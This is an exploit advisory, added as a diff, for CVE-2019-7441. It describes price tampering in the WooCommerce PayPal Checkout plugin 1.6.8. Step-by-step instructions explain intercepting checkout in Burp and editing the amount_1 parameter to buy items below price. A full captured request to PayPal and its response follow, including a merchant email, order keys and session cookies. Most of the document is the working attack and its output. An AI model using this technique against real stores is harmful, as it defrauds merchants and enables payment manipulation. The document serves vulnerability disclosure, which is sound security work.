@@ -1,0 +1,75 @@
+# Exploit Title: cgi-bin/webscr?cmd=_cart in the WooCommerce PayPal Checkout Payment Gateway plugin 1.6.8 for WordPress allows Parameter Tampering in an amount parameter (such as amount_1), as demonstrated by purchasing an item for lower than the intended price
+# Date: 27.01.2019
+# Product Title :Woocommerce Paypal gateway Plugin
+# Vendor Homepage: https://wordpress.org
+# Software Link  : https://wordpress.org/plugins/woocommerce-gateway-paypal-express-checkout/
+# Category: Web Applications Plugin (Wordpress)
+# Version: 1.6.8
+# Active installations: 700,000+
+# Exploit Author: Vikas Chaudhary
+# Contact: https://gkaim.com/contact-us/
+# Web:  https://gkaim.com/
+# Tested on: Windows 10 -Firefox .
+# CVE-2019-7441
+*****************************************************
+## VENDOR  SUMMARY :-  This is a PayPal Checkout Payment Gateway for WooCommerce.
+PayPal Checkout allows you to securely sell your products and subscriptions online using In-Context Checkout to help you meet security requirements without causing your theme to suffer. In-Context Checkout uses a modal window, hosted on PayPalís servers, that overlays the checkout form and provides a secure means for your customers to enter their account information
+
+## Vulnerability Description => The Web Parameter Tampering attack is based on the manipulation of parameters exchanged between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etc. Usually, this information is stored in cookies, hidden form fields, or URL Query Strings, and is used to increase application functionality and control.
+This attack can be performed by a malicious user who wants to exploit the application for their own benefit, or an attacker who wishes to attack a third-person using a Man-in-the-middle attack. In both cases, tools likes Webscarab and Paros proxy are mostly used. 
+__________________________________
+Proof Of Concept:- PoC
+1 -Install Woocommerce Paypal checkout gateway plugin (1.6.8) in Remote.
+2- Now fix a price of any product  and configure it with this plguin.
+3- Do checkout through paypal and capture the data from burp.
+5- Here you will find post based request with amount parameter- Now Edit amount parameter as you want and forward it .
+6- You will see a new price and you can purchase that product on your new edited price.
+-------------------
+Post REQUEST:-
+GET /cgi-bin/webscr?cmd=_cart&business=gkaim100%40gmail.com&no_note=1&currency_code=INR&charset=utf-8&rm=2&upload=1&return=https%3A%2F%2Fa2zcourse.com%2Fcheckout%2Forder-received%2F798%2F%3Fkey%3Dwc_order_wJp0p80pFSg8V%26utm_nooverride%3D1&cancel_return=https%3A%2F%2Fa2zcourse.com%2Fbasket%2F%3Fcancel_order%3Dtrue%26order%3Dwc_order_wJp0p80pFSg8V%26order_id%3D798%26redirect%26_wpnonce%3D68f71663cb&page_style=A2Zcourse.com&image_url=&paymentaction=sale&bn=WooThemes_Cart&invoice=A2Z-798&custom=%7B%22order_id%22%3A798%2C%22order_key%22%3A%22wc_order_wJp0p80pFSg8V%22%7D&notify_url=https%3A%2F%2Fa2zcourse.com%2Fwc-api%2FWC_Gateway_Paypal%2F&first_name=dfkjk&last_name=v%3Blbkm&address1=&address2=&city=&state=&zip=&country=&email=sdflmnvkj%40xncv.com&night_phone_b=8908098090&no_shipping=1&tax_cart=0.00&item_name_1=Artificial+Intelligence+2018+Build+the+Most+Powerful+AI&quantity_1=1&amount_1=5000&item_number_1=Artificial+Intelligence+2018 HTTP/1.1
+Host: www.paypal.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://a2zcourse.com/checkout/
+Connection: close
+Upgrade-Insecure-Requests: 1
+----------------
+Post RESPONSE:--
+HTTP/1.1 302 Moved Temporarily
+Server: Apache
+X-Recruiting: If you are reading this, maybe you should be working at PayPal instead! Check out https://www.paypal.com/us/webapps/mpp/paypal-jobs
+Paypal-Debug-Id: 2f8e90a8c5e72
+Cache-Control: no-cache
+x-content-type-options: nosniff
+x-xss-protection: 1; mode=block
+x-frame-options: SAMEORIGIN
+content-security-policy: default-src 'self' https://*.paypal.com; script-src 'nonce-iJYgKZYXXhHUAluelfhZan+dO96W5x49hsgMXR3ZPHDRR/SI' 'self' https://*.paypal.com 'unsafe-inline' 'unsafe-eval'; img-src https://*.paypalobjects.com; object-src 'none'; font-src 'self' https://*.paypalobjects.com; form-action 'self' https://*.paypal.com; base-uri 'self' https://*.paypal.com; block-all-mixed-content; report-uri https://www.paypal.com/csplog/api/log/csp
+HTTP_X_PP_AZ_LOCATOR: dcg13.slc
+Paypal-Debug-Id: 2f8e90a8c5e72
+Location: https://www.paypal.com/webapps/hermes?token=13V78288LV2795452&useraction=commit&rm=2&mfid=1548578790132_2f8e90a8c5e72
+Cache-Control: max-age=0, no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Type: text/html; charset=utf-8
+DC: ccg11-origin-www-1.paypal.com
+Content-Length: 302
+X-EdgeConnect-MidMile-RTT: 219
+X-EdgeConnect-Origin-MEX-Latency: 801
+Date: Sun, 27 Jan 2019 08:46:30 GMT
+Connection: close
+Vary: Accept-Encoding
+Set-Cookie: tsrce=xorouternodeweb; Domain=.paypal.com; Path=/; Expires=Wed, 30 Jan 2019 08:46:30 GMT; HttpOnly; Secure
+Set-Cookie: ts=vr%3D8e7d19d1168ac1200012cd39fff5bb0f%26vreXpYrS%3D1643249566%26vteXpYrS%3D1548580589%26vt%3D8e7d19d4168ac1200012cd39fff5bb0e; Domain=.paypal.com; Path=/; Expires=Thu, 27 Jan 2022 02:12:47 GMT; HttpOnly; Secure
+Set-Cookie: nsid=s%3AU8TmrvBUulZLtqFmT9F1ZeoVNf4dKoAr.slyvmBwJFEJx4Uxt4mNU%2BJH%2BrDf5uxLrKECnBRm%2FQ0I; Path=/; HttpOnly; Secure
+Set-Cookie: X-PP-SILOVER=name%3DLIVE5.WEB.1%26silo_version%3D880%26app%3Dxorouternodewebxclick%26TIME%3D3849276764%26HTTP_X_PP_AZ_LOCATOR%3Ddcg13.slc; Expires=Sun, 27 Jan 2019 09:16:30 GMT; domain=.paypal.com; path=/; Secure; HttpOnly
+Set-Cookie: X-PP-SILOVER=; Expires=Thu, 01 Jan 1970 00:00:01 GMT
+Set-Cookie: AKDC=ccg11-origin-www-1.paypal.com; expires=Sun, 27-Jan-2019 09:16:30 GMT; path=/; secure
+Set-Cookie: akavpau_ppsd=1548579390~id=8b5783ec5a9b02390092591f951f54f8; Domain=www.paypal.com; Path=/; Secure; HttpOnly
+Strict-Transport-Security: max-age=63072000
+
+<p>Found. Redirecting to <a href="https://www.paypal.com/webapps/hermes?token=13V78288LV2795452&useraction=commit&rm=2&mfid=1548578790132_2f8e90a8c5e72">https://www.paypal.com/webapps/hermes?token=13V78288LV2795452&useraction=commit&rm=2&mfid=1548578790132_2f8e90a8c5e72</a></p>
+
+---------------------------------------------------------
+
+___________________________________
